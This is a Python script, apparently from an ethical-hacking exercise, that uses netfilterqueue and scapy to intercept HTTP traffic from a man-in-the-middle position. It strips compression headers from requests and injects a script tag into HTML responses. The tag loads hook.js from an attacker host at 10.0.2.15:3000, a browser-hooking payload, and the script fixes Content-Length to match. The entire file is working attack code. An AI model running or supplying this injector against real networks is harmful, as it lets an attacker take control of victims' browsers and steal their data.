#!/usr/bin/env python3 

import netfilterqueue as nq
import scapy.all as scapy
import re

def set_load(scapy_packet, load):
    print(f'[+] replacing file')
    scapy_packet[scapy.Raw].load = load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet
    

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
        load = scapy_packet[scapy.Raw].load
        #print(scapy_packet.show())
        if scapy_packet[scapy.TCP].dport == 80: #8080 for bettercap
            print(f'HTTP Request')
            load = re.sub("Accept-Encoding:.*?\r\n".encode(), "".encode(), load)
            load = load.replace("HTTP/1.1".encode(), "HTTP/1.0".encode())
            #print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 80: #8080 for bettercap
            print(f'HTTP Response')
            injection_code = "<script src='http://10.0.2.15:3000/hook.js'></script>"
            load = load.replace("</body>".encode(), (injection_code+ "</body>").encode())

            # Rexgex: Non-capturing group
            content_length_search = re.search("(?:Content-Length:\s)(\d*)".encode(), load)
            
            if content_length_search and "text/html".encode() in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                load = load.replace(content_length, str(new_content_length).encode())
            #print(scapy_packet.show()) 

        # This gets executed if the load is modified   
        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load(scapy_packet, load)
            packet.set_payload(bytes(new_packet))


    packet.accept()

queue = nq.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

